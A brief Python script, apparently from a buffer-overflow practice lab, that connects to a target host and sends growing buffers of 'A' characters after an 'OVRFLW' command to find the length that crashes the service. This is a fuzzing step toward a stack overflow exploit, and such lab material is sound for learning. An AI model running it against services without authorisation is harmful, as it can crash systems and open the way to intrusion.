#!/usr/bin/env python3
import socket,sys,time

from PARAMETERS import RHOST, RPORT

# Incremental buffer size detection
timeout = 5

buffer_list = []
counter = 200

# This will create a list of buffers up to 5000 chars (200, 400, 600, ...).
while len(buffer_list) < 50:
    buffer_list.append(b"A" * counter)
    counter += 200

for buf in buffer_list:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((RHOST, RPORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(buf))
        s.send(b"OVRFLW " + buf + b"\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + RHOST + ":" + str(RPORT))
        sys.exit(0)
    time.sleep(2)
